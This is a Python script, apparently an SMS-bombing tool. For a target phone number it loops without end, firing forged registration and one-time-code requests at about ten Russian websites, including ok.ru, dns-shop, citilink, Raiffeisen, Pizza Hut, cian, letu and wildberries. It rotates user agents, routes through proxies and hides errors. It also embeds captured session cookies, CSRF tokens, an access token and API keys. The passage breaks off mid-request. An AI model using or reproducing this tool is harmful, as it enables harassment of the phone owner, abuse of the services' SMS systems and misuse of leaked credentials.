import requests
import user_agents
import main
from main import spambox
import time
import json


def spam(number):
    b = True
    while b:
        try:
            user = user_agents.get_user()
            num = number
            num2 = ""
            num2 += "+"
            num2 += '7'
            num2 += '('
            num2 += num[1]
            num2 += num[2]
            num2 += num[3]
            num2 += ')'
            num2 += num[4]
            num2 += num[5]
            num2 += num[6]
            num2 += '-'
            num2 += num[7]
            num2 += num[8]
            num2 += '-'
            num2 += num[9]
            num2 += num[10]
            time.sleep(2)

            for obj in spambox.get_array():
                if obj.number == number:
                    try:
                        header = {
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'cache-control': 'max-age=0',
                            'content-length': '25',
                            'content-type': 'application/x-www-form-urlencoded',
                            'cookie': 'JSESSIONID=a42d2ee7b58c347d1c614a1a013544a17651b0a68c29bd2f.9bedfb08; bci=1871035486256896851; _statid=5ea6268e-ddfb-4699-974c-d09fd19bb66a; landref=yandex.ru; viewport=1032; _ym_uid=1658092644731300424; _ym_d=1658092644; _ym_isad=1; mtrc=%7B%22mytrackerid%22%3A53328%7D',
                            'dnt': '1',
                            'origin': 'https://ok.ru',
                            'referer': 'https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-user': '?1',
                            'upgrade-insecure-requests': '1',
                            'user-agent': user
                        }

                        payload = {
                            'st.r.phone': '+' + number
                        }

                        requests.post(
                            'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
                            data=payload, headers=header)
                    except:
                        pass
                    try:
                        header = {
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'Connection': 'keep-alive',
                            'Content-Length': '25',
                            'content-type': 'application/x-www-form-urlencoded',
                            'Cookie': 'city_path=moscow; current_path=9565a5103f36ecea17597b8bfe0de40efdc12ecd83502fc6a8abccb573ee963ba%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A116%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22default%22%7D%22%3B%7D; phonesIdent=5c5850539481e5dfaf6501ccec31923494b6f6327536f010c1851adae1c19e13a%3A2%3A%7Bi%3A0%3Bs%3A11%3A%22phonesIdent%22%3Bi%3A1%3Bs%3A36%3A%22cb04f377-3909-4313-9515-38e0f16f40b4%22%3B%7D; _ga=GA1.2.1077691371.1648506632; rrpvid=237990906799456; _ym_d=1648507072; _ym_uid=16485070724884085; lang=ru; cookieImagesUploadId=148f94fe5986ba5a926f6013164b4eff839438f61a613e7b64fd3fb4fbbe1a85a%3A2%3A%7Bi%3A0%3Bs%3A20%3A%22cookieImagesUploadId%22%3Bi%3A1%3Bs%3A36%3A%22107c0e7b-d098-4e04-baf6-ace2caa07378%22%3B%7D; _ab_=d296a4450e43512a5caac3c58811113651854db8805f13e4348e7c7d37971c94a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22_ab_%22%3Bi%3A1%3Ba%3A1%3A%7Bs%3A12%3A%22price-filter%22%3Bs%3A17%3A%22CATALOG_WITH_ADDS%22%3B%7D%7D; auth_public_uid=c49d16596017c745fa17f96e4225ac69; date-user-last-order-v2=8a0959c6170daf8712c77f5448afa3aba2062a69aefbbad68eb530f68cf8dba2a%3A2%3A%7Bi%3A0%3Bs%3A23%3A%22date-user-last-order-v2%22%3Bi%3A1%3Bi%3A-36000%3B%7D; cartUserCookieIdent_v3=d5d9f4f5c1775775b823f28723600896bb3163bf9f8d5fd469f4dbe08295229ca%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%2218f80cbc-6983-33b6-9ac3-7ce88bd22e85%22%3B%7D; _gid=GA1.2.709521899.1658202855; auth_access_token=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTgyNjA4NDMsInJuZCI6ImZkYmQ0YjRjMzY4MDVkMzZmM2NmMWE1Zjg5MWRmM2ZkMGJlODdkODc3M2FiODE2NTUzNzY3MDkwOTg4ZTg3ZjAiLCJ1c2VySWQiOiJkOWU1ZTkwNi0zMjQ3LWEyY2YtMTZiNi1jZGNkNWEyM2YxYTEiLCJ1c2VyTmFtZSI6IiJ9.MEQCIH20fowQn6tTc2782ZBvdYP307xgzsnvWoxv52PtjVH7AiABP_xLEvW6ovh14wFnvlE5KFPGkFnGcW4Dpz1u1gAM3g; auth_refresh_token=9ea2d3f8fbb2d351cbbf891aec94d36b3d2714d894aba28b3544043ce1a56645; auth_ssid=5322bf683a98fd52ae8a9771ac5af41d7c2c88503adc0d6c021ec03862a73423; PHPSESSID=46d748baf2fed7fd89e5686ba7addf32; notify_user=C1qq%2B7HrwC7Ky5dFmPPydsEaQ%2BYkXo0a02fvgrfrBA1HQnFVe3aw3ZKL7I08MQUWNTVRnIT1h0zoGUSQjrgPxw%3D%3D; notify_visitor=nE5LCKNnN5JIa2ioiyQCkMuQdW73i9YkAYpA%2B2kLCm3%2BlHqL%2FDVzMuaxN6VPxIpHarczABJL%2FWpDDyEwCQtrcw%3D%3D; profile__csrf=04f51f3cc5ce23f5812082550f43b5a1e7f2c1ce4fd3ea368ed06773163f3011a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22profile__csrf%22%3Bi%3A1%3Bs%3A32%3A%22gU0ciYIJddxthkWudlqCEDAaH0Py7pfw%22%3B%7D; profile_phonesIdent=1469ae96725566a0f87f4338f28de2947f7c42f093118209227239ec2c2c32aca%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22profile_phonesIdent%22%3Bi%3A1%3Bs%3A36%3A%2236d7b94e-8883-43f4-a3b7-3a0a66947e79%22%3B%7D; rerf=AAAAAGLXCug/TKthJqnAAg==; ipp_uid=1658260200212/PmOcH5BZ4a5Od2Q1/w2qFVmBf12TTWqdOpvWquw==; ipp_key=v1658260200212/v33947245ba5adc7a72e273/O+X65vdCghsCABj/W+q/Qw==',
                            'DNT': '1',
                            'Host': 'profile.dns-shop.ru',
                            'Origin': 'https://profile.dns-shop.ru',
                            'Referer': 'https://profile.dns-shop.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin',
                            'User-Agent': user,
                            'X-CSRF-Token': 'nfpJtVVrr7lBL2s-_nBakbZQki3iwMdMs24BufQ1YYj6r3nWPDLm8yVLE0qWGw3k0jzjbqeEhi37XlHAw0UH_w==',
                            'X-Requested-With': 'XMLHttpRequest'
                        }

                        payload = {
                            'phone': number,
                            'token': ''
                        }

                        requests.post('https://profile.dns-shop.ru/uniformProfile/personal/confirm-code-send/',
                                      data=payload, headers=header)
                    except:
                        pass
                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '0',
                            'cookie': 'old_design=0; _tuid=c6448b0a001e3090da7e86e5ae7b4bd2f27e523c; _space=spb_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; ab_test_analytics=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; _dy_csc_ses=t; _dy_c_exps=; _pcl=eW5i1HY5TuPGBg==; is_show_welcome_mechanics=1; _dy_ses_load_seq=47503%3A1658091107276; _dy_c_att_exps=; _dy_soct=1017570.1030352.1658091107*1033770.1068198.1658091107*1036008.1075335.1658091107*1046273.1214460.1658091107*1008131.1012968.1658091107*1015299.1026208.1658091107',
                            'dnt': '1',
                            'origin': 'https://www.citilink.ru',
                            'referer': 'https://www.citilink.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-requested-with': 'XMLHttpRequest'
                        }

                        requests.post(f'https://www.citilink.ru/registration/confirm/phone/+{number}/', headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'Accept': 'application/json, text/javascript, */*; q=0.01',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'Connection': 'keep-alive',
                            'Content-Length': '24',
                            'Content-Type': 'application/json',
                            'Cookie': 'geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; mobile=false; device=pc; _ga=GA1.2.823290515.1656377291; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; _ym_uid=16563772911015405951; _ym_d=1656377291; __zzat129=MDA0dBA=Fz2+aQ==; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; cfids129=; APPLICATION_CONTEXT_CITY=21; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F102.0.5005.115%20Safari%2F537.36%20OPR%2F88.0.4412.75; _gid=GA1.2.229297435.1657385025; _ym_isad=1; _ym_visorc=b; geo_detect_coords=55.796539%2C49.1082; geo_detect_url=kazan; geo_detect=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C%2C%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%20%D0%A2%D0%B0%D1%82%D0%B0%D1%80%D1%81%D1%82%D0%B0%D0%BD%2C%D0%9F%D1%80%D0%B8%D0%B2%D0%BE%D0%BB%D0%B6%D1%81%D0%BA%D0%B8%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; _gat=1; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form',
                            'DNT': '1',
                            'Host': 'oapi.raiffeisen.ru',
                            'Origin': 'https://www.raiffeisen.ru',
                            'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-site',
                            'User-Agent': user
                        }

                        payload = {"number": number}

                        requests.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms',
                                      json=payload,
                                      headers=header, proxies=proxies)
                    except:
                        pass

                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '210',
                            'content-type': 'application/json',
                            'dnt': '1',
                            'origin': 'https://pizzahut.ru',
                            'referer': 'https://pizzahut.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-site',
                            'user-agent': user
                        }

                        payload = {"operationName": "sendSmsRegistration", "variables": {"phone": number},
                                   "query": "mutation sendSmsRegistration($phone: String!) {\n  sendSmsRegistration(phone: $phone) {\n    phone\n    __typename\n  }\n}\n"}

                        requests.post('https://ruhqphdevback01.pizzahut.ru/graphql', json=payload, headers=header,
                                      proxies=proxies,
                                      verify=False)
                    except:
                        pass
                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '50',
                            'content-type': 'application/json',
                            'cookie': 'cf_clearance=pUtn2Uhr8jZdtAgsnZpYoNMETwur_MgjVR5XAI_hxuk-1656377505-0-150; _CIAN_GK=21a640c3-5527-4144-9257-13f54f73cf06; session_region_id=1; adb=1; login_mro_popup=1; sopr_utm=%7B%22utm_source%22%3A+%22direct%22%2C+%22utm_medium%22%3A+%22None%22%7D; __cf_bm=EGOlfqwI74sY05RNNtRJ41UXSjo7iz_mwq26osjK_I4-1657385366-0-AX0+cpmNhrd8kjYCDL3fJfDcWsmaONkTlro/xo6fIgrm2MJUi3gHI/lrechBtSe6NH8qoD0QUFWTj1GCZ4iA+Nw=; sopr_session=dfbcc56b7faf4662',
                            'dnt': '1',
                            'origin': 'https://www.cian.ru',
                            'referer': 'https://www.cian.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-site',
                            'user-agent': user
                        }

                        payload = {
                            "phone": "+" + number,
                            "type": "authenticateCode"
                        }

                        requests.post('https://ud-api.cian.ru/sms/v2/send-validation-code/', json=payload,
                                      headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += "+"
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += ' '
                        num2 += '-'
                        num2 += ' '
                        num2 += num[7]
                        num2 += num[8]
                        num2 += ' '
                        num2 += '-'
                        num2 += ' '
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'accept': 'application/json, text/javascript, */*; q=0.01',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '219',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'cookie': 'city=%D0%A3%D1%84%D0%B0; city_auto=%D0%A3%D1%84%D0%B0; PHPSESSID=4MjylRdnF2wecKdI9mZ644mmZBQPsJTr; BITRIX_SM_GUEST_ID=1119274; BITRIX_SM_LAST_ADV=7_Y; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A10%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153957133624831; _ym_d=1657153957; _ym_isad=1; _ym_visorc=w; city_checked=true; BITRIX_SM_LAST_VISIT=07.07.2022+03%3A36%3A40',
                            'dnt': '1',
                            'origin': 'https://madyart.ru',
                            'referer': 'https://madyart.ru/reg/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-requested-with': 'XMLHttpRequest'
                        }

                        payload = {
                            'wct_reg_fio': 'Пупкин',
                            'wct_reg_fio2': 'Вася',
                            'wct_reg_phone': num2,
                            'wct_reg_ch': 'Y',
                            'wct_reg_1': '',
                            'wct_reg_2': '',
                            'wct_reg_3': '1',
                            'wc_phone_psw': 'Google123',
                            'wc_phone_psw2': 'Google123'
                        }

                        requests.post('https://madyart.ru/local/aut.php', data=payload, headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += "+"
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += '-'
                        num2 += num[7]
                        num2 += num[8]
                        num2 += '-'
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'accept': 'application/json',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '49',
                            'content-type': 'application/json',
                            'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; language=ru-RU; ssaid=81e148c0-bf40-11ec-b2af-fd9071e6be4e; _ga=GA1.2.1488420238.1656547396; _ym_d=1656547396; _ym_uid=1650304436300168392; iap.uid=05edc3da24e744d985197bcea804f655; __tld__=null; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1NTQwNDIzMjMwMCIsImF1dGhvcml0aWVzIjoiUk9MRV9BTk9OWU1PVVMiLCJzaXRlSWQiOiJzdG9yZU1vYmlsZVJVIiwiaWF0IjoxNjU4NTAxNzExLCJleHAiOjE2NTg1ODgxMTF9.a3F7xVn1e7sXsou9oQ8O3cd3INVQXsbuRlyPa_GGD9pTWI4ZbxnlxStGmVHTmcPiSIt5SKxrmmPkDyGJtd17bg; JSESSIONID=kI5ZODsJZyfPn_6uQhvrdkZSrJI_.letu-wru-05; cityDetected=true; letu.marker.src_id="srcid=sem_yandex&srcid2=search_brand"; _gcl_au=1.1.1465884998.1658501717; _gid=GA1.2.970117108.1658501718; tmr_lvid=1d0c4c6c6f887593714d715b82fd201f; tmr_lvidTS=1658501717833; _ym_isad=1; tmr_detect=1%7C1658501717840; _gat_ddm=1; mindboxDeviceUUID=4b99ae4c-f1c8-42a9-aae4-135bc4e69485; directCrm-session=%7B%22deviceGuid%22%3A%224b99ae4c-f1c8-42a9-aae4-135bc4e69485%22%7D; flocktory-uuid=98d1d2ec-f2a2-43e2-b94b-d51ec4f9c13d-8; cityGuessed=true; tmr_reqNum=10',
                            'dnt': '1',
                            'origin': 'https://www.letu.ru',
                            'referer': 'https://www.letu.ru/promo/11550043?srcid=sem_yandex&srcid2=search_brand&utm_medium=cpc&utm_source=yandex_letu&utm_campaign=Brend_Poisk_ves_mir_Action%7C75965483&utm_term=%D0%BB%D1%8D%D1%82%D1%83%D0%B0%D0%BB%D1%8C&utm_content=k50id%7C0100000039735914258_%7Ccid%7C75965483%7Cgid%7C4960197635%7Caid%7C12375976536%7Cadp%7Cno%7Cpos%7Cpremium1%7Csrc%7Csearch_none%7Cdvc%7Cdesktop%7Cmain&k50id=0100000039735914258_&etext=2202.BHsOtI0seJdSpXloeWcyDaQOLi9VvEZVattxWWHjgjF5cXZmd2l1aXpsaHBqbXNy.1b56ea5996af7589b1ec0b6e967d612b66d7e900&_openstat=ZGlyZWN0LnlhbmRleC5ydTs3NTk2NTQ4MzsxMjM3NTk3NjUzNjt5YW5kZXgucnU6cHJlbWl1bQ&yclid=4158890799608943602',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-instana-l': '1,correlationType=web;correlationId=dfaa6202796e3904',
                            'x-instana-s': 'dfaa6202796e3904',
                            'x-instana-t': 'dfaa6202796e3904',
                            'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
                        }

                        payload = {
                            "phoneNumber": num2,
                            "captcha": ""
                        }

                        requests.post(
                            'https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU',
                            json=payload, headers=header, proxies=proxies)

                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += "+"
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += '-'
                        num2 += num[7]
                        num2 += num[8]
                        num2 += '-'
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'bx-ajax': 'true',
                            'content-length': '100',
                            'content-type': 'application/x-www-form-urlencoded',
                            'cookie': 'BITRIX_SM_LOCATION_SHOW_FIRST=Y; BITRIX_SM_SALE_UID=14278587; BITRIX_SM_EVRAZ_CURRENT_LOC_ID=93; BITRIX_SM_EVRAZ_LAST_IP_V2=178.170.198.53; operator=0; authorization=0; BITRIX_SM_EVRAZ_LOC_ID=93; BITRIX_SM_EVRAZ_CITY=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; PHPSESSID=dht920OeuwO0zg0WpS7XtRnQidNljqgm',
                            'dnt': '1',
                            'origin': 'https://spb.evraz.market',
                            'referer': 'https://spb.evraz.market/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user
                        }

                        payload = {
                            'userPhone': num2,
                            'captchaCode': '',
                            'captchaWord': '',
                            'sessid': 'ac6ac34893c17c4e741846e83cf0104e'
                        }

                        requests.post(
                            'https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms',
                            data=payload, headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += '+'
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += ' '
                        num2 += num[7]
                        num2 += num[8]
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'Connection': 'keep-alive',
                            'Content-Length': '398',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'DNT': '1',
                            'Host': 'accounts.eu1.gigya.com',
                            'Origin': 'https://cdns.eu1.gigya.com',
                            'Referer': 'https://cdns.eu1.gigya.com/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-site',
                            'User-Agent': user
                        }

                        payload = {
                            'phoneNumber': num2,
                            'lang': 'ru',
                            'APIKey': '4_eXEZkSmgY277qYb5XXqALQ',
                            'source': 'showScreenSet',
                            'sdk': 'js_latest',
                            'authMode': 'cookie',
                            'pageURL': 'https://mega.ru/',
                            'gmid': 'gmid.ver4.AcbHeQOgVA.WnFLjnxHAZJlHXbPSBOGwOT94PmaAMXnuAG3_n0y7-4fkOIJqlokay-B8TDupP2M.WaSZ_ByPi8_llIxjwUT67KZevbkijR1_LMyA48WsFNWy7VOGI5Eob2wMLj1Crh9Wy6-J1YMWGPf3NMUOXUBBpg.sc3',
                            'ucid': 'NGvv00DdQGL_7np4-w6tpA',
                            'sdkBuild': '13232',
                            'format': 'json',
                        }

                        requests.post('https://accounts.eu1.gigya.com/accounts.otp.sendCode', data=payload,
                                      headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '948',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'cookie': 'BasketUID=d15861d0-fde7-40ef-9486-15f5f7381a65; _wbauid=7539586261657398304; route=1657398306.022.11810.653561|e1694d492c822662a2bcfd079c8a6249; __wbl=cityId%3D0%26regionId%3D0%26city%3D%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3%26phone%3D84957755505%26latitude%3D59%2C939037%26longitude%3D30%2C315784%26src%3D1; __store=125238_125239_125240_117673_122258_122259_117734_159402_2737_117544_132043_161812_121709_124731_117501_507_204939_3158_120762_117986_130744_1733_686_1193; __region=68_64_83_4_38_80_33_70_82_86_30_69_22_66_31_40_1_48; __pricemargin=1.0--; __cpns=12_7_3_6_5_18_21; __sppfix=; __dst=-1216601_-337422_-1114902_-1198055; ncache=125238_125239_125240_117673_122258_122259_117734_159402_2737_117544_132043_161812_121709_124731_117501_507_204939_3158_120762_117986_130744_1733_686_1193%3B68_64_83_4_38_80_33_70_82_86_30_69_22_66_31_40_1_48%3B1.0--%3B12_7_3_6_5_18_21%3B%3B-1216601_-337422_-1114902_-1198055; __tm=1657409105; ___wbu=72ab583c-1a27-4864-8474-5b41218cd7f9.1657398305; ___wbs=6c070b97-34ee-4c58-8068-17c9d27c2172.1657398305; __wba_s=1; _wbSes=CfDJ8BtF0T5sZrlIuLVvoGBKRZYJnDGnbDnUGeofJNe9r7tYx%2FUiHEOqBf7z3K90FJYL9jW631hJqx3P9GiLYtr6fFaSKBp%2FqqslfMxrrJH7tD%2B0lEXdPlq3vKDcLVwzqATQAedgX5kxKDOPRQbDGbZNJpCL7Su0ltRcVNasOUDBGj1K',
                            'origin': 'https://www.wildberries.ru',
                            'referer': 'https://www.wildberries.ru/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2F',
                            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-kl-ajax-request': 'Ajax_Request',
                            'x-requested-with': 'XMLHttpRequest',
                            'x-spa-version': '9.3.4',
                        }

                        payload = {
                            'phoneInput.AgreeToReceiveSmsSpam': False,
                            'phoneInput.ConfirmCode': '',
